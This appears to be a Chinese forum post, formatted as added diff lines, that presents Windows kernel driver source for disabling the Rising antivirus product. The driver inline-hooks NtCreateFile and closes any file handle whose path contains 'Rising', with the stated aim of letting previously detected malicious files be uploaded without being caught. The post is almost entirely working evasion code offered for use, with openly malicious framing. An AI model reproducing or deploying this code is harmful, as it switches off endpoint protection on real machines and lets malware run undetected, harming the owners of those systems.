@@ -1,0 +1,165 @@
+-
+发篇文章吧，一直在娱乐，从未杀病毒---让瑞星失效很简单~
+
+
+在回顾sudami的文章《干掉KV 2008, Rising等大部分杀软》的时候
+
+发现其实对付瑞星，可以不用去结束进程就有一种很easy的方法让它失效，这个时候可以肆意的上传原先被杀的文件而不被瑞星查杀，
+
+瑞星形同虚设了，肆意的蹂躏吧。
+
+代码很简单，重在思路~
+
+#include <ntddk.h>
+#include "InlineHook.h"
+
+typedef NTSTATUS (*NtCreateFile)(OUT PHANDLE FileHandle,
+         IN ACCESS_MASK DesiredAccess,
+         IN POBJECT_ATTRIBUTES ObjectAttributes,
+         OUT PIO_STATUS_BLOCK IoStatusBlock,
+         IN PLARGE_INTEGER AllocationSize OPTIONAL,
+         IN ULONG FileAttributes,
+         IN ULONG ShareAccess,
+         IN ULONG CreateDisposition,
+         IN ULONG CreateOptions,
+         IN PVOID EaBuffer OPTIONAL,
+         IN ULONG EaLength);
+NtCreateFile OldNtCreateFile;
+
+int NtCreateFilePatchCodeLen = 0;
+
+#pragma LOCKEDCODE
+PVOID NtCreateFileRet;
+
+int iProcess = FALSE;
+
+#pragma LOCKEDCODE
+__declspec(naked) NTSTATUS NtCreateFileHookZone(,...)
+{
+_asm
+{
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   _emit 0x90;
+   jmp [NtCreateFileRet];
+}
+}
+#pragma LOCKEDCODE
+wchar_t* __stdcall FindSubStringW(const wchar_t *str,int nLength,const wchar_t *strSearch)
+{
+wchar_t   *cp=(wchar_t *)str;   
+wchar_t   *s1, *s2;  
+
+if(!*strSearch)   
+   return ((wchar_t *)str);  
+
+while(nLength && *cp )   
+{   
+   s1   =   cp;   
+   s2   =   (wchar_t*)strSearch;  
+
+   while(*s1 && *s2 && !(*s1-*s2))   
+    s1++,   s2++;  
+
+   if(!*s2)   
+    return(cp);   
+   cp++;
+   nLength--;
+}  
+
+return(NULL);  
+
+}
+NTSTATUS DriverUnload( 
+       IN PDRIVER_OBJECT DriverObject 
+       )
+{
+if (iProcess == TRUE)
+{
+   UnHookApi(L"ZwCreateFile",TRUE,0,(PVOID)NtCreateFileHookZone,NtCreateFilePatchCodeLen);
+}
+DbgPrint("Driver Unload\n");
+return STATUS_SUCCESS;
+}
+#pragma LOCKEDCODE
+NTSTATUS
+NewNtCreateFile(OUT PHANDLE FileHandle,
+     IN ACCESS_MASK DesiredAccess,
+     IN POBJECT_ATTRIBUTES ObjectAttributes,
+     OUT PIO_STATUS_BLOCK IoStatusBlock,
+     IN PLARGE_INTEGER AllocationSize OPTIONAL,
+     IN ULONG FileAttributes,
+     IN ULONG ShareAccess,
+     IN ULONG CreateDisposition,
+     IN ULONG CreateOptions,
+     IN PVOID EaBuffer OPTIONAL,
+     IN ULONG EaLength)
+{
+NTSTATUS status;
+
+DbgPrint("Hook Success\n");
+
+OldNtCreateFile = (NtCreateFile)NtCreateFileHookZone;
+
+status = OldNtCreateFile(FileHandle,
+                       DesiredAccess,
+                       ObjectAttributes,
+                       IoStatusBlock,
+                       AllocationSize,
+                       FileAttributes,
+                       ShareAccess,
+                       CreateDisposition,
+                       CreateOptions,
+                       EaBuffer,
+                       EaLength);
+if( NT_SUCCESS(status)) 
+{
+   DbgPrint("Hook Success File Handle :%x %ws\n",FileHandle,ObjectAttributes->ObjectName->Buffer);
+   if (FindSubStringW(ObjectAttributes->ObjectName->Buffer,ObjectAttributes->ObjectName->MaximumLength/2,L"Rising"))
+   {
+    ZwClose(FileHandle);                 //关闭句柄，这样瑞星就形同虚设了~
+    return STATUS_INSUFFICIENT_RESOURCES;
+
+   }
+   status = STATUS_SUCCESS;
+}
+return status;
+}
+NTSTATUS 
+DriverEntry( 
+    IN PDRIVER_OBJECT DriverObject, 
+    IN PUNICODE_STRING RegistryPath 
+    )
+{
+int bRet;
+
+DbgPrint("Hello World\n");
+DriverObject->DriverUnload = DriverUnload;
+
+//从SSDT中获取ZwCreateFile地址，由ZwCreateFile获取NtCreateFile的地址并挂钩
+bRet = InlineHookApi((DWORD)NewNtCreateFile,L"ZwCreateFile",TRUE,0,(PVOID)NtCreateFileHookZone,&NtCreateFilePatchCodeLen,&NtCreateFileRet);
+if(!bRet)
+{
+   DbgPrint("hook NtCreateFile failed\n");
+
+}else{
+
+   iProcess = TRUE;
+}
+return STATUS_SUCCESS;
+}
+
+
